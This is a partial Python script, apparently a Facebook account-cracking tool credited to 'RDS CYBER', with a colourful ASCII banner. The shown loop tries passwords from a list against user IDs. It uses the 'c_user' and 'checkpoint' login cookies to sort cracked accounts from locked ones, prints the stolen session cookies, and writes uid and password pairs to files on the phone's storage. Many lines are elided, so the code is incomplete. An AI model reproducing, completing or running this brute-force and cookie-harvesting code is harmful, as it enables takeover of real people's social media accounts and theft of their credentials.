...
╚═╝░░╚═╝╚═════╝░╚═════╝░
\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m RDS CYBER
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m RDS
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m LOOK ID
\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mPTAA NHI
        ...
        for ps in pwx:
           ...
           'user-agent': 'pro',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m=[SHARP-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
                open('/sdcard/SHARP-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m=[SHARP-LK💔]= {uid}|{ps}")
                open('/sdcard/SHARP-LK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
